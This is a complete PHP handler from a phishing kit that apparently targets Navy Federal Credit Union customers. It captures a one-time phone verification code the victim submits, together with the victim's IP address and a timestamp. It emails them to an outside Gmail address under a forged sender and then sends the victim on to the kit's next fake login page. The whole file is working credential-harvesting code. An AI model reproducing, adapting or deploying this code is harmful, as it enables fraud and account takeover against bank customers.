<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$usal = $_POST['vcd'];
$fiftyme="zate123man@gmail.com";


  $subj = "NavyFC $ip";
  $msg = "Code Info\n\nPhone Code: $usal\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>
<script type="text/javascript">
 window.location="Login_Step_3.html"
</script>
